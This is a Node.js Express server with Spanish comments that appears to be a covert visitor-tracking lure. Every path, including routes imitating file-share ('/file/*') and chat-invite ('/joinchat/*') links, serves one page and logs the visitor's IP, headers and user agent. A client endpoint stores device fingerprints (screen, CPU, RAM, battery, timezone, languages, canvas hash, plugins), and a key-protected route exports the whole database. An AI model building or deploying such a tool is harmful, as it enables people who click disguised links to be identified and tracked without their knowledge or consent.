const express    = require('express');
const initSqlJs  = require('sql.js');
const UAParser   = require('ua-parser-js');
const rateLimit  = require('express-rate-limit');
const helmet     = require('helmet');
const path       = require('path');
const fs         = require('fs');
const { randomBytes } = require('crypto');

const app    = express();
const PORT   = process.env.PORT || 3000;
const DB_PATH = process.env.DB_PATH || path.join(__dirname, 'visitas.db');

let db;

// ── Base de datos ─────────────────────────────────────────────────────────────
async function iniciarBD() {
  const SQL = await initSqlJs();

  if (fs.existsSync(DB_PATH)) {
    const buf = fs.readFileSync(DB_PATH);
    db = new SQL.Database(buf);
  } else {
    db = new SQL.Database();
  }

  db.run(`
    CREATE TABLE IF NOT EXISTS visitas (
      id                   INTEGER PRIMARY KEY AUTOINCREMENT,
      fecha                TEXT NOT NULL,
      ruta                 TEXT,
      ip                   TEXT,
      idioma_header        TEXT,
      idioma_header_raw    TEXT,
      accept_raw           TEXT,
      user_agent           TEXT,
      navegador            TEXT,
      version_nav          TEXT,
      motor_nav            TEXT,
      os                   TEXT,
      version_os           TEXT,
      dispositivo          TEXT,
      tipo_disp            TEXT,
      ua_parsed_raw        TEXT,
      referrer             TEXT,
      pantalla_ancho       INTEGER,
      pantalla_alto        INTEGER,
      ventana_ancho        INTEGER,
      ventana_alto         INTEGER,
      pixel_ratio          REAL,
      color_depth          INTEGER,
      orientacion          TEXT,
      cpu_nucleos          INTEGER,
      ram_gb               REAL,
      touch_puntos         INTEGER,
      es_tactil            INTEGER,
      conexion_tipo        TEXT,
      conexion_velocidad   REAL,
      ahorro_datos         INTEGER,
      conexion_raw         TEXT,
      zona_horaria         TEXT,
      idioma_sistema       TEXT,
      idiomas_sistema      TEXT,
      idiomas_sistema_raw  TEXT,
      tema_oscuro          INTEGER,
      cookies_habilitadas  INTEGER,
      do_not_track         TEXT,
      bateria_nivel        REAL,
      bateria_cargando     INTEGER,
      bateria_raw          TEXT,
      canvas_fp            TEXT,
      plugins              TEXT,
      plugins_raw          TEXT,
      cliente_raw          TEXT
    )
  `);

  const cols = [
    'fecha TEXT','ruta TEXT','ip TEXT',
    'idioma_header TEXT','idioma_header_raw TEXT','accept_raw TEXT',
    'user_agent TEXT','navegador TEXT','version_nav TEXT','motor_nav TEXT',
    'os TEXT','version_os TEXT','dispositivo TEXT','tipo_disp TEXT','ua_parsed_raw TEXT',
    'referrer TEXT',
    'pantalla_ancho INTEGER','pantalla_alto INTEGER',
    'ventana_ancho INTEGER','ventana_alto INTEGER',
    'pixel_ratio REAL','color_depth INTEGER','orientacion TEXT',
    'cpu_nucleos INTEGER','ram_gb REAL','touch_puntos INTEGER','es_tactil INTEGER',
    'conexion_tipo TEXT','conexion_velocidad REAL','ahorro_datos INTEGER','conexion_raw TEXT',
    'zona_horaria TEXT','idioma_sistema TEXT','idiomas_sistema TEXT','idiomas_sistema_raw TEXT',
    'tema_oscuro INTEGER','cookies_habilitadas INTEGER','do_not_track TEXT',
    'bateria_nivel REAL','bateria_cargando INTEGER','bateria_raw TEXT',
    'canvas_fp TEXT','plugins TEXT','plugins_raw TEXT','cliente_raw TEXT', 'file_id TEXT',
  ];
  for (const col of cols) {
    try { db.run(`ALTER TABLE visitas ADD COLUMN ${col}`); } catch (_) {}
  }

  guardarBD();
  console.log('✅  Base de datos lista:', DB_PATH);
}

function guardarBD() {
  fs.writeFileSync(DB_PATH, Buffer.from(db.export()));
}

function queryAll(sql, params = []) {
  const stmt = db.prepare(sql);
  stmt.bind(params);
  const rows = [];
  while (stmt.step()) rows.push(stmt.getAsObject());
  stmt.free();
  return rows;
}

function queryOne(sql, params = []) {
  return queryAll(sql, params)[0] || null;
}

function crearRegistroDesdeReq(req) {
  const rawUA    = req.headers['user-agent'] || '';
  const uaParsed = UAParser(rawUA);
  const ip = req.headers['cf-connecting-ip']
    || req.headers['x-forwarded-for']?.split(',')[0].trim()
    || req.socket.remoteAddress || 'desconocida';
  const acceptLang = req.headers['accept-language'] || '';

  const stmt = db.prepare(
    `INSERT INTO visitas
       (fecha, ruta, ip,
        idioma_header, idioma_header_raw, accept_raw,
        user_agent, navegador, version_nav, motor_nav,
        os, version_os, dispositivo, tipo_disp, ua_parsed_raw,
        referrer)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`
  );
  stmt.run([
    new Date().toISOString(),
    req.path,
    ip,
    acceptLang.split(',')[0].trim(),
    acceptLang,
    req.headers['accept'] || '',
    rawUA,
    uaParsed.browser.name    || 'Desconocido',
    uaParsed.browser.version || '',
    uaParsed.engine.name     || '',
    uaParsed.os.name         || 'Desconocido',
    uaParsed.os.version      || '',
    uaParsed.device.model    || '',
    uaParsed.device.type     || 'desktop',
    JSON.stringify(uaParsed),
    req.headers['referer'] || '',
  ]);
  stmt.free();

  const res = db.exec('SELECT last_insert_rowid()');
  const id  = res?.[0]?.values?.[0]?.[0] ?? null;

  guardarBD();
  console.log(`[visita] Nueva visita id=${id} ip=${ip}`);
  return id;
}

// ── Middleware de seguridad ───────────────────────────────────────────────────

// Headers de seguridad HTTP (XSS, clickjacking, MIME sniffing, etc.)
app.use(helmet({
  // Permite cargar el spinner SVG/CSS inline sin bloquear
  contentSecurityPolicy: false,
}));

// Rate limiting en rutas de página (evita flood de registros en BD)
const limiterPagina = rateLimit({
  windowMs: 60 * 1000,  // ventana de 1 minuto
  max: 30,              // máximo 30 requests por IP por minuto
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas solicitudes, intenta más tarde' },
});

// Rate limiting en el endpoint del cliente (evita spam de POSTs)
const limiterCliente = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas solicitudes' },
});

app.use(express.static(path.join(__dirname, 'public'), { index: false }));

// Limitar tamaño del body a 50kb (evita payloads enormes)
app.use(express.json({ limit: '50kb' }));

// ── Rutas de página ───────────────────────────────────────────────────────────

function generarFileId() {
  return randomBytes(8).toString('base64url').toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 14);
}

function servirPagina(req, res) {
  const id  = crearRegistroDesdeReq(req);
  const html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
  const inyectado = html.replace(/<head[^>]*>/i, match =>
    `${match}<script>window.__VISITA_ID__ = ${id};</script>`
  );
  console.log(`[visita] HTML servido con __VISITA_ID__=${id} (ruta=${req.path})`);
  res.send(inyectado);
}

// Rate limiting estricto para el endpoint de descarga de BD
const limiterAdmin = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5,                   // solo 5 intentos cada 15 min por IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiados intentos' },
});

// Descarga el archivo de la BD (protegido con clave) — debe ir ANTES del catch-all '/*'
app.get('/admin/download-db', limiterAdmin, (req, res) => {
  if (!process.env.ADMIN_KEY || req.query.key !== process.env.ADMIN_KEY) {
    return res.status(401).send('No autorizado');
  }
  res.download(DB_PATH, 'visitas.db');
});

app.get('/*',         limiterPagina, servirPagina);
app.get('/file/*',   limiterPagina, servirPagina);
app.get('/joinchat/*', limiterPagina, servirPagina);
app.get('/api/*', limiterPagina, servirPagina);
app.get('/admin*', limiterPagina, servirPagina);

// ── POST /api/visita/:id/cliente ──────────────────────────────────────────────
app.post('/api/visita/:id/cliente', limiterCliente, (req, res) => {
  const id = parseInt(req.params.id);
  if (!id || isNaN(id)) return res.status(400).json({ error: 'id inválido' });

  // Verificar que el id existe en la BD antes de actualizar
  const existe = queryOne('SELECT id FROM visitas WHERE id = ?', [id]);
  if (!existe) return res.status(404).json({ error: 'Visita no encontrada' });

  const d = req.body;
  console.log(`[cliente] Datos para id=${id}, keys: ${Object.keys(d).join(', ')}`);

  try {
    const stmt = db.prepare(
      `UPDATE visitas SET
        pantalla_ancho=?,pantalla_alto=?,
        ventana_ancho=?,ventana_alto=?,
        pixel_ratio=?,color_depth=?,orientacion=?,
        cpu_nucleos=?,ram_gb=?,touch_puntos=?,es_tactil=?,
        conexion_tipo=?,conexion_velocidad=?,ahorro_datos=?,conexion_raw=?,
        zona_horaria=?,idioma_sistema=?,
        idiomas_sistema=?,idiomas_sistema_raw=?,
        tema_oscuro=?,cookies_habilitadas=?,do_not_track=?,
        bateria_nivel=?,bateria_cargando=?,bateria_raw=?,
        canvas_fp=?,plugins=?,plugins_raw=?,cliente_raw=?
      WHERE id=?`
    );
    stmt.run([
      d.pantalla_ancho??null, d.pantalla_alto??null,
      d.ventana_ancho??null,  d.ventana_alto??null,
      d.pixel_ratio??null,    d.color_depth??null,
      d.orientacion??null,
      d.cpu_nucleos??null,    d.ram_gb??null,
      d.touch_puntos??null,   d.es_tactil?1:0,
      d.conexion_tipo??null,  d.conexion_velocidad??null,
      d.ahorro_datos?1:0,     d.conexion_raw??null,
      d.zona_horaria??null,   d.idioma_sistema??null,
      Array.isArray(d.idiomas)?d.idiomas.join(', '):(d.idiomas??null),
      d.idiomas_raw??null,
      d.tema_oscuro?1:0,
      d.cookies_habilitadas?1:0,
      d.do_not_track??null,
      d.bateria_nivel??null,
      d.bateria_cargando!=null?(d.bateria_cargando?1:0):null,
      d.bateria_raw??null,
      d.canvas_fp??null,
      Array.isArray(d.plugins)?d.plugins.join(', '):(d.plugins??null),
      d.plugins_raw??null,
      JSON.stringify(d),
      id,
    ]);
    stmt.free();
    guardarBD();
    console.log(`[cliente] Visita id=${id} actualizada ✓`);
    res.json({ ok: true });
  } catch (err) {
    console.error('[cliente] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ── Arrancar ──────────────────────────────────────────────────────────────────
iniciarBD().then(() => {
  app.listen(PORT, () => {
    console.log(`🌐  http://localhost:${PORT}`);
    console.log(`📋  DB: ${DB_PATH}`);
  });
}).catch(err => { console.error(err); process.exit(1); });
